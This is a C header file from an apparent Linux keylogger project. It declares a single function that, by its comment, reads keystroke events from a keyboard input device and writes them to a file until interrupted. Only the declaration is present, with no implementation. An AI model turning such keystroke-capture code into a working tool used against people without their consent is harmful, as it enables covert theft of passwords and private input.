#ifndef DEMON_KEYLOGGER_KEYLOGGER_H
#define DEMON_KEYLOGGER_KEYLOGGER_H

#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#define NUM_EVENTS 128

/**
 * Captures keystrokes by reading from the keyboard resource and writing to
 * the writeout file. Continues reading until SIGINT is received. A newline is
 * appended to the end of the file.
 *
 * @param keyboard The file descriptor for the keyboard input file
 * @param writeout The file descriptor to write keystrokes out to
 */
void keylogger(int keyboard, int writeout);

#endif //DEMON_KEYLOGGER_KEYLOGGER_H
